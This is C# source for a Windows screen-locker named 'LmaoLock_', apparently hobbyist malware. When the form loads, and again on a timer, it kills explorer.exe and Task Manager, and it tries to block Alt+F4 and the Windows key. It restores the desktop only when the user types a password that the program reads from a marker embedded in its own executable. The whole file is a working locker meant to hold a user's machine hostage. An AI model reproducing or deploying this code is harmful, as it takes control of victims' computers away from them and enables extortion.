using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LmaoLock_
{
    public partial class Form1 : Form
    {

        [DllImport("dwmapi.dll")]
        public static extern int DwmExtendFrameIntoClientArea(IntPtr hWnd, ref MARGINS pMarInset);

        [DllImport("dwmapi.dll")]
        public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);

        [DllImport("dwmapi.dll")]
        public static extern int DwmIsCompositionEnabled(ref int pfEnabled);

        private bool m_aeroEnabled;                     // variables for box shadow
        private const int CS_DROPSHADOW = 0x00020000;
        private const int WM_NCPAINT = 0x0085;

        public struct MARGINS                           // struct for box shadow
        {
            public int leftWidth;
            public int rightWidth;
            public int topHeight;
            public int bottomHeight;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                m_aeroEnabled = CheckAeroEnabled();

                CreateParams cp = base.CreateParams;
                if (!m_aeroEnabled)
                    cp.ClassStyle |= CS_DROPSHADOW;

                return cp;
            }
        }

        private bool CheckAeroEnabled()
        {
            if (Environment.OSVersion.Version.Major >= 6)
            {
                int enabled = 0;
                DwmIsCompositionEnabled(ref enabled);
                return (enabled == 1) ? true : false;
            }
            return false;
        }

        protected override void WndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case WM_NCPAINT:                        // box shadow
                    if (m_aeroEnabled)
                    {
                        var v = 2;
                        DwmSetWindowAttribute(this.Handle, 2, ref v, 4);
                        MARGINS margins = new MARGINS()
                        {
                            bottomHeight = 1,
                            leftWidth = 1,
                            rightWidth = 1,
                            topHeight = 1
                        };
                        DwmExtendFrameIntoClientArea(this.Handle, ref margins);

                    }
                    break;
                default:
                    break;
            }
            base.WndProc(ref m);


        }

        public Form1()
        {
            InitializeComponent();
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Random kek = new Random();
            int shit, lol, kekz;
            shit = kek.Next(0, 255);
            lol = kek.Next(0, 255);
            kekz = kek.Next(0, 255);

            label1.ForeColor = Color.FromArgb(shit, lol, kekz);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            textBox1.UseSystemPasswordChar = true;
            try
            {
                {
                    
                    Process[] skid = Process.GetProcessesByName("explorer");
                    foreach (Process skidz in skid)
                        skidz.Kill();
                    Process[] kek = Process.GetProcessesByName("explorer.exe");
                    foreach (Process nope in kek)
                        nope.Kill();
                    Process[] lmao = Process.GetProcessesByName("TaskMgr");
                    foreach (Process yeah in lmao)
                        yeah.Kill();
                       
                }

            }
            catch (Exception ex)
            {

            }
            Kill.Start();
        }

        private void fh(object sender, System.Windows.Forms.KeyEventArgs e)
        {

            if (e.KeyCode == System.Windows.Forms.Keys.Alt & e.KeyCode == System.Windows.Forms.Keys.F4)
            {
                this.Show();
                e.Handled = true;
            }

            if (e.KeyCode == System.Windows.Forms.Keys.W & e.KeyCode == System.Windows.Forms.Keys.Control)
            {
                this.Show();
                e.Handled = true;
            }
            if (e.KeyCode == System.Windows.Forms.Keys.Control & e.KeyCode == System.Windows.Forms.Keys.Alt)
            {
                this.Show();
                e.Handled = true;
            }
            if (e.KeyData == System.Windows.Forms.Keys.LWin)
            {
                this.Show();
                e.Handled = true;
            }


            if (e.KeyValue == 91 & e.KeyCode == System.Windows.Forms.Keys.F4)
            {
                this.Show();
                e.Handled = true;
            }

        }

        private void Kill_Tick(object sender, EventArgs e)
        {
            {
                Process[] kekz = Process.GetProcessesByName("explorer");
                foreach (Process xxx in kekz)
                    xxx.Kill();
                Process[] kek = Process.GetProcessesByName("explorer.exe");
                foreach (Process lmao in kek)
                    lmao.Kill();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string splitz = "||||SPLITTTT||||";
            FileSystem.FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read);

            string data = Strings.Space(Convert.ToInt32(FileSystem.LOF(1)));
            FileSystem.FileGet(1, ref data);
            FileSystem.FileClose(1);

            string[] options;
            options = Strings.Split(data, splitz);


            if (textBox1.Text == options[1])
            {
                try
                {
                    var ExProcess = new Process();
                    ExProcess.StartInfo.UseShellExecute = true;
                    ExProcess.StartInfo.CreateNoWindow = true;

                    ExProcess.StartInfo.FileName = @"c:\windows\explorer.exe";
                    ExProcess.StartInfo.WorkingDirectory = Application.StartupPath;
                    ExProcess.Start();
                    this.Close();
                }
                catch (Exception ex)
                {

                }
            }
        }
    }
}
